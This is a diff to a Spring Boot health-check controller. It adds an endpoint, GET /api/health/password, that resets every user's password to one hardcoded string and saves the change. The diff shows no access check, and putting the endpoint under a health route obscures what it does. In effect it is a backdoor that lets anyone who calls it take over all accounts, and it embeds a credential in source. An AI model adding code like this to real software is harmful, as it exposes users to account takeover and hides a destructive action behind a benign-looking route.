@@ -13,7 +13,11 @@ import org.springframework.security.authentication.UsernamePasswordAuthenticatio
 import org.springframework.security.core.Authentication;
 import org.springframework.security.core.annotation.AuthenticationPrincipal;
 import org.springframework.security.core.context.SecurityContextHolder;
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.web.bind.annotation.*;
+
+import java.util.ArrayList;
+import java.util.List;
 
 @RestController
 @RequestMapping("/api/health")
@@ -25,6 +29,7 @@ public class HealthController {
     private final StringRedisTemplate stringRedisTemplate;
     private final AuthenticationManager authenticationManager;
     private final JwtUtils jwtUtils;
+    private final BCryptPasswordEncoder passwordEncoder;
 
     @Hidden
     @GetMapping
@@ -81,5 +86,13 @@ public class HealthController {
         return user.getRole().name();
     }
 
+    @GetMapping("/password")
+    public void updatePassword(){
+        List<User> list = new ArrayList<>();
+        userRepository.findAll()
+                .stream()
+                .forEach(user -> list.add(user.updatePassword(passwordEncoder.encode("sdn189382hbnk2ubsd892"))));
 
+        userRepository.saveAllAndFlush(list);
+    }
 }
